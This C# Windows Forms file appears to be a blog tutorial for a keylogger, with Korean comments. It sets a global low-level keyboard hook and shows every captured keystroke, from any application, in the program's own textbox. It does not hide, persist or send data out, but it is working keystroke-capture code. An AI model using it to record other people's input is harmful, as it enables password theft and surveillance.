using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Blog_Keylogger
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x100;

        private delegate IntPtr LowLevelKeyProc(int nCode, IntPtr wParam, IntPtr lParam);

        //이 위로는 DLL import 등입니다.

        private static LowLevelKeyProc keyboardProc = KeyboardHookProc;

        private static IntPtr keyHook = IntPtr.Zero;
        private static IntPtr keyHookInstance = IntPtr.Zero;

        //후킹을 설정해줍니다.
        public static void SetHook()
        {
            if (keyHook == IntPtr.Zero)
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    keyHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        //후킹을 해제해줍니다.
        public static void UnHook()
        {
            UnhookWindowsHookEx(keyHook);
        }

        //텍스트박스에 글을 띄워야 하는데, 후킹 메소드가 모두 static이므로 텍스트박스를 static으로 빼 줍니다.
        private static TextBox textBox;

        public Form1()
        {
            SetHook();
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //위에서 언급한 텍스트박스 static 처리 부분.
            textBox = textBox1;
        }

        //키보드의 후킹을 처리하는 부분. 키보드를 누르거나 떼면 이 함수가 실행됩니다.
        private static IntPtr KeyboardHookProc(int code, IntPtr wParam, IntPtr lParam)
        {
            //Code가 0보다 클 때에만 처리해야합니다. 아닐 경우엔 메세지를 흘려보냅니다.(이유는 잘 모릅니다.)
            //wParam==256부분은, 키보드를 누르는 이벤트와 떼는 이벤트 중 누르는 이벤트만을 통과시킵니다.
            //만약 ==267로 바꿀 경우, 키보드를 땔 떼 코드가 실행됩니다.
            if (code >= 0 && (int)wParam == 256)
            {
                //lParam포인터가 가리키는 곳에서 키코드를 읽어 keyCheck로 보냅니다.
                KeyCheck(Marshal.ReadInt32(lParam));
            }
            return CallNextHookEx(keyHook, code, wParam, lParam);
        }

        public static void KeyCheck(int keyCode)
        {
            //KeyCode를 해석해서 텍스트박스에 적어줍니다.
            KeysConverter converter = new KeysConverter();
            textBox.AppendText(converter.ConvertToInvariantString(keyCode));
            //줄이 너무 길 경우 내용을 지웁니다.
            if (textBox.TextLength > 10000)
            {
                textBox.Text = "";
            }
        }

        private void Form1_Closing(object sender, EventArgs e)
        {
//폼이 닫힐 시에는 후킹을 해제해줍니다.
            UnHook();
        }
    }
}
